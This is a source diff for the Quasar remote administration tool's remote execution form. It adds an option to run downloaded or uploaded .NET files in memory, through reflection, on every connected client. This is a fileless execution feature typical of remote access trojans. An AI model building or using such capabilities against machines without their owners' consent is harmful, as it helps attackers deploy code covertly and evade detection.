@@ -34,6 +34,7 @@ namespace Quasar.Server.Forms
         }
 
         private bool _isUpdate;
+        private bool _executeInMemoryDotNet;
 
         public FrmRemoteExecution(Client[] clients)
         {
@@ -110,6 +111,7 @@ namespace Quasar.Server.Forms
         private void btnExecute_Click(object sender, EventArgs e)
         {
             _isUpdate = chkUpdate.Checked;
+            _executeInMemoryDotNet = chkBoxReflectionExecute.Checked;
 
             if (radioURL.Checked)
             {
@@ -118,14 +120,14 @@ namespace Quasar.Server.Forms
                     if (!txtURL.Text.StartsWith("http"))
                         txtURL.Text = "http://" + txtURL.Text;
 
-                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate);
+                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet);
                 }
             }
             else
             {
                 foreach (var handler in _remoteExecutionMessageHandlers)
                 {
-                    handler.FileHandler.BeginUploadFile(txtPath.Text);
+                    handler.FileHandler.BeginUploadFile(txtPath.Text, "");
                 }
             }
         }
@@ -172,7 +174,7 @@ namespace Quasar.Server.Forms
 
                     if (transfer.Status == "Completed")
                     {
-                        handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate);
+                        handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate, _executeInMemoryDotNet);
                     }
                     return;
                 }
